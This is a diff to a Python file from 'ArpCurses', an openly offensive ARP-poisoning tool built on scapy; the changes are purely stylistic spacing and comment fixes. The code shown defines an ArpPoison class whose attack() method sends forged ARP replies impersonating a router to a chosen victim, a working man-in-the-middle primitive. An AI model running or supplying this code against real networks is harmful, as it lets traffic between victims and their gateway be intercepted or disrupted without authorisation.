@@ -1,5 +1,5 @@
 """
-    ArpCurses v1.0 - The ArpPoisoning tool. 
+    ArpCurses v1.0 - The ArpPoisoning tool.
     Copyright (C) 2016  Giovanni D'Italia
 
     This program is free software: you can redistribute it and/or modify
@@ -19,9 +19,10 @@ import threading
 from scapy.layers.l2 import *
 from scapy.route import *
 
+
 class ArpPoison():
     """docstring for ArpPoison"""
-    def __init__(self, iface=None, router=None,victim=None,verbose=0):
+    def __init__(self, iface=None, router=None, victim=None, verbose=0):
         """
         Keyword arguments:
         iface -- the network interface
@@ -33,22 +34,20 @@ class ArpPoison():
         self.router = router
         self.victim = victim
         self.verbose = verbose
-        #configure scapy's variable for sending packets
-        conf.iface= self.iface
+        # configure scapy's variable for sending packets
+        conf.iface = self.iface
 
     def attack(self):
         """Start to send poisoned packets to the victim"""
-        #create and send FAKE arp packets
-        send(ARP(psrc = self.router,pdst = self.victim),verbose = self.verbose)
-        
+        # create and send FAKE arp packets
+        send(ARP(psrc=self.router, pdst=self.victim), verbose=self.verbose)
+
     def setIFace(self, iface):
         self.iface = iface
-        conf.iface= self.iface
-    
+        conf.iface = self.iface
+
     def setRouter(self, router):
         self.router = router
-        
+
     def setVictim(self, victim):
         self.victim = victim
-
-        
